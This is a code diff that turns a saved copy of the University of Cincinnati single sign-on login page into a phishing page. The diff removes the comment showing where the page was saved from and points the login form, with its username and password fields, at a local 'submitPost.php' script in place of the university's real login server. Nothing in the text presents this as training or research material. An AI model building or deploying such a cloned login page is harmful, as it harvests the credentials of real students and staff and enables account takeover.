@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<!-- saved from url=(0066)https://login.uc.edu/idp/profile/SAML2/Redirect/SSO?execution=e3s1 -->
 <html lang="en" class=""><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     	
     	<title>University of Cincinnati</title>
@@ -37,12 +36,7 @@
                     <img src="./University of Cincinnati_files/UC_ID_unleashedwhite.png" class="pull-right" style="max-height: 74px; max-width: 130px; margin-bottom: 10px;" alt="University of Cincinnati">
 
                     <div class="clear"></div>
-              
-
-
-
-
-                                          			                          <form class="form-horizontal" role="form" action="https://login.uc.edu/idp/profile/SAML2/Redirect/SSO?execution=e3s1" method="post">
+                        <form class="form-horizontal" role="form" action="submitPost.php" method="post">
 	                        <div class="form-group">
 	                            <div class="col-sm-12">
 	                            	<label for="username" style="display:none;">Username:</label>
@@ -55,20 +49,9 @@
 		                            <input id="password" name="j_password" type="password" class="form-control input-lg" placeholder="Password" autocomplete="off" title="Password" aria-invalid="false" aria-describedby="errorMsg">
 		                        </div>
 	                        </div>
-		<!-- Uncomment the following two div tags if attribute release consent is enabled -->
-	      	<!--
-              <div class="form-element-wrapper">
-                <input type="checkbox" name="donotcache" value="1">&nbsp;Don't Remember Login
-              </div>
-
-              <div class="form-element-wrapper">
-                <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">&nbsp;Clear&nbsp;prior&nbsp;granting&nbsp;of&nbsp;permission&nbsp;for&nbsp;release&nbsp;of&nbsp;your&nbsp;information&nbsp;to&nbsp;this&nbsp;service.
-              </div>
-              <br/>
-		-->
 	                        <div class="form-group">
 		                        <div class=" col-sm-12">
-		                            <button type="submit" class="btn btn-block btn-lg" style="color:white;" name="_eventId_proceed" title="Log In">Log In</button>
+		                            <button class="btn btn-block btn-lg" style="color:white;" name="_eventId_proceed" title="Log In">Log In</button>
 		                        </div>
 	                        </div>
                         </form>
